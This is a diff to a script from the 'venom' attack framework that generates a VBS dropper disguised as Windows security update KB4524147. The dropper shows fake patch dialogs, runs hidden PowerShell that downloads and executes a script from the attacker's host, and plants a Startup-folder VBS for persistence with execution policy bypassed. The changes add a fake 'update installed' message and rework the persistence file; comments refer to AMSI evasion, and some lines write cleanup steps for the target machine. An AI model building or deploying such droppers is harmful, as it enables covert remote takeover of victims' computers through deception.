@@ -12076,11 +12076,12 @@ else
    # REMARK: A MessageBox will pop up announcing that are KB updates available.
    # TODO: Wait for @coding9 to know if shell works.. then: & ('ie'+'x')
    echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
-   echo "Dim domain,x" >> $IPATH/output/$Drop.vbs
+   echo "Dim domain,x,k" >> $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
    echo "domain = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
    echo "x=MsgBox(\"This Security Patch Adresses CVE-2020-12067\"  & vbCrLf & \"RCE Vulnerability Under OS Builds 18362.535\" ,0+48, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
    echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
+   echo "k=MsgBox(\"Security Update Successfully Installed ..\" ,0+64, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
 fi
 
 
@@ -12165,14 +12166,16 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
+## Build Report File in output folder ..
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
 else
    echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q $Drop.bat" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "del /F /Q $Drop.vbs" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
 fi
 zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.txt" --info > /dev/null 2>&1
 sh_menu
@@ -12277,7 +12280,8 @@ else
    # better persistence social engineering build
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Agent execution (no terminal prompt) using VBS script.
-      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
+      echo "' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
+      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
    else
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
@@ -12513,7 +12517,8 @@ else
    # better persistence social engineering build
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Agent execution (no terminal prompt) using VBS script.
-      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
+      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
    else
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
